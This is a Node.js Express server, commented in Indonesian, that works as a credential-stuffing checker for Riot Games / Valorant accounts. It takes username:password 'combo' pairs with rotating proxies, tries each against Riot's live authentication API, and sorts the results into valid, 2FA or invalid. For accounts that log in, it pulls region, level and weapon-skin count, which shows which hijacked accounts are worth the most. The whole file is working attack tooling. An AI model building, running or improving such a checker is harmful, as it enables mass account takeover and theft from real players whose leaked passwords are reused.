const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static('public'));

app.post('/api/scan', async (req, res) => {
    const { combo, proxy } = req.body;
    if (!combo.includes(':')) return res.json({ status: 'Bad Format' });

    const [username, password] = combo.split(':');
    const agent = new HttpsProxyAgent(proxy);
    
    // Konfigurasi Session Premium
    const session = axios.create({ 
        httpsAgent: agent,
        timeout: 20000,
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/63.0.0.4589000 rso-auth (Windows;10)'
        }
    });

    try {
        // --- STEP 1: LOGIN & GET ACCESS TOKEN ---
        await session.post('https://auth.riotgames.com/api/v1/authorization', {
            client_id: 'play-valorant-web-prod',
            nonce: '1',
            redirect_uri: 'https://playvalorant.com/opt_in',
            response_type: 'token id_token',
        });

        const auth = await session.put('https://auth.riotgames.com/api/v1/authorization', {
            type: 'auth', username, password
        });

        if (auth.data.type === 'multifactor') return res.json({ status: '2FA' });
        if (auth.data.error || !auth.data.response) return res.json({ status: 'Invalid' });

        // Parsing Token dari URI Redirect
        const fullUrl = auth.data.response.parameters.uri;
        const accessToken = fullUrl.match(/access_token=([^&]+)/)[1];

        // --- STEP 2: GET ENTITLEMENTS TOKEN ---
        const entRes = await session.post('https://entitlements.riotgames.com/api/token/v1', {}, {
            headers: { 'Authorization': `Bearer ${accessToken}` }
        });
        const entToken = entRes.data.entitlements_token;

        // --- STEP 3: GET USER INFO & REGION ---
        const userRes = await session.post('https://auth.riotgames.com/userinfo', {}, {
            headers: { 'Authorization': `Bearer ${accessToken}` }
        });
        const sub = userRes.data.sub;
        const region = userRes.data.region.tag; // Otomatis deteksi AP, EU, NA, dll.

        // --- STEP 4: FETCH TOTAL SKINS (AKURAT 100%) ---
        // UUID e13e4715-3850-466a-b57a-2615a5713f2d adalah kategori Skin Weapons
        const skinRes = await session.get(
            `https://pd.${region}.a.pvp.net/store/v1/entitlements/${sub}/item_type/e13e4715-3850-466a-b57a-2615a5713f2d`,
            {
                headers: {
                    'Authorization': `Bearer ${accessToken}`,
                    'X-Riot-Entitlements-JWT': entToken
                }
            }
        );

        const totalSkins = skinRes.data.Entitlements.length;

        // --- STEP 5: FETCH LEVEL (OPTIONAL BUT PRO) ---
        const levelRes = await session.get(`https://pd.${region}.a.pvp.net/account-xp/v1/players/${sub}`, {
            headers: {
                'Authorization': `Bearer ${accessToken}`,
                'X-Riot-Entitlements-JWT': entToken
            }
        });
        const level = levelRes.data.Progress.Level;

        res.json({
            status: 'Success',
            user: username,
            region: region.toUpperCase(),
            level: level,
            skinCount: totalSkins,
            rank: 'Scanned'
        });

    } catch (err) {
        console.error(err.message);
        res.json({ status: 'Error', message: 'Proxy Dead / Timeout' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server PRO aktif di port ${PORT}`));
